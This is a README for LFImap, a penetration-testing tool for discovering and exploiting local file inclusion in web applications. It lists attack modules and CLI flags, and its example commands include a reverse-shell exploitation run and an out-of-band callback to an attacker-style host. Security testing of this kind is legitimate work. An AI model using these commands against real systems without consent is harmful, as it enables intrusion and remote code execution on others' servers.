# LFImap
### Local file inclusion discovery and exploitation tool

This project has been rewritten in Go for improved performance and easier deployment.
Inspired by [SQLmap](https://github.com/sqlmapproject/sqlmap).

#### Main features
- Attack with different modules
    - Filter wrapper file inclusion
    - Data wrapper remote command execution
    - Input wrapper remote command execution
    - Expect wrapper remote command execution
    - File wrapper file inclusion
    - Attacks with path traversal
    - Remote file inclusion
    - Custom polyglot command injection
    - Heuristic scans
        - Custom polyglot XSS, CRLF checks
        - Open redirect check
        - Error-based file inclusion info leak

- Testing modes
    - -U -> specify single URL to test
    - -F -> specify wordlist of URLs to test
    - -R -> specify raw http from a file to test

- Full control over the HTTP request
    - Specification of parameters to test (GET, FORM-line, Header, custom injection point)
    - Specification of custom HTTP header(s)
    - Ability to test with arbitrary form-line (POST) data
    - Ability to test with arbitrary HTTP method
    - Ability to pivot requests through a web proxy (HTTP, HTTPS, SOCKS5)
    - Ability to log all requests and responses to a file
    - Ability to tune testing with timeout in between requests and maximum response time
    - Support for payload manipulation via url and base64 encoding(s)
    - Quick mode (-q), where LFImap uses fewer carefully selected payloads
    - Second order (stored) vulnerability check support
    - Beta/Testing phase CSRF handling support

## Installation

### From source (requires Go 1.21+)

```bash
git clone https://github.com/hansmach1ne/lfimap.git
cd lfimap
go build ./cmd/lfimap
./lfimap --help
```

### Install globally

```bash
go install github.com/hansmach1ne/lfimap/cmd/lfimap@latest
```

## Usage

```
lfimap [flags]

TARGET OPTIONS:
  -U, --url string          Single URL to test
  -F, --file string         Load multiple URLs to test from a file
  -R, --request string      Load single request to test from a file

REQUEST OPTIONS:
  -C, --cookie string       HTTP session Cookie header
  -D, --data string         HTTP request FORM-data
  -H, --header stringArray  Additional HTTP header(s)
  -M, --method string       Request method to use for testing
  -P, --proxy string        Use a proxy to connect to the target endpoint
      --useragent string    HTTP user-agent header value
      --referer string      HTTP referer header value
      --placeholder string  Custom testing placeholder name (default "PWN")
      --delay int           Delay in milliseconds after each request
      --max-timeout int     Number of seconds after giving up on a response (default 5)
      --http-ok ints        HTTP response code(s) to treat as valid (default [200,204,301,302,303])
      --csrf-param string   Parameter used to hold anti-CSRF token
      --csrf-method string  HTTP method to use during anti-CSRF token page visit
      --csrf-url string     URL address to visit for extraction of anti-CSRF token
      --csrf-data string    POST data to send during anti-CSRF token page visit
      --second-method string Specify method for second order request
      --second-url string   URL for second order request
      --second-data string  FORM-line data for second-order request
      --force-ssl           Force usage of HTTPS/SSL if otherwise not specified
      --no-stop             Don't stop using the same testing technique upon findings
      --no-redirect         Don't follow HTTP redirects

ATTACK TECHNIQUE:
  -f, --filter              Attack using filter wrapper
  -i, --input               Attack using input wrapper
  -d, --php-data            Attack using data wrapper
  -e, --expect              Attack using expect wrapper
  -t, --trunc               Attack using path traversal with wordlist
  -r, --rfi                 Attack using remote file inclusion
  -c, --cmd                 Attack using command injection
      --file-wrapper        Attack using file wrapper
      --heuristics          Test for miscellaneous issues using heuristics
  -a, --all                 Use all supported attack methods

PAYLOAD OPTIONS:
  -n, --encode int          URL-encode payloads N times
  -q, --quick               Perform quick testing with fewer payloads
  -x, --exploit             Exploit and achieve reverse shell if RCE is available
      --lhost string        Local IP address for reverse connection
      --lport int           Local port number for reverse connection
      --callback string     Callback location for out of band detection

WORDLIST OPTIONS:
      --wordlist string     Path to wordlist for path traversal modality
      --use-long            Use long.txt wordlist for path traversal modality

OUTPUT OPTIONS:
      --log string          Output all requests and responses to specified file
      --no-color            Disables colored output for STDOUT
  -v, --verbose             Print more detailed output when performing attacks
  -h, --help                Print this help message
```

### Examples

#### 1) Utilize all supported attack modules with '-a'.
```bash
lfimap -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a
```

![LFImap_A](https://github.com/hansmach1ne/LFImap/assets/57464251/7692235a-dfcd-4cab-b0bd-aefdd873cae6)

#### 2) Post argument testing with '-D'
```bash
lfimap -U "http://IP/index.php" -D "page=PWN" -a
```

![LFIMAP_POST](https://github.com/hansmach1ne/LFImap/assets/57464251/ebd6b1a4-8990-4a36-b321-871fe9271313)


#### 3) Reverse shell remote command execution attack with '-x'
```bash
lfimap -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a -x --lhost <IP> --lport <PORT>
```

![LFIMAP_revshell](https://github.com/hansmach1ne/LFImap/assets/57464251/5d64244c-8a37-4019-bf2f-8fa7eb6bfd69)



#### 4) Out-of-Band blind vulnerability verbose testing support with '--callback'
```bash
lfimap -U "http://IP/index.php?param=PWN" -a -v --callback="attacker.oastify.com"
```

![LFIMAP_OOB](https://github.com/hansmach1ne/LFImap/assets/57464251/d49d3a80-1c34-49fd-97d8-eb870dae040d)


If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it, as soon as I can.
Pull requests are welcome.

[!] Disclaimer: LFImap usage for attacking web applications without consent of the application owner is illegal. Developers assume no liability and are
not responsible for any misuse and damage caused by using this program.
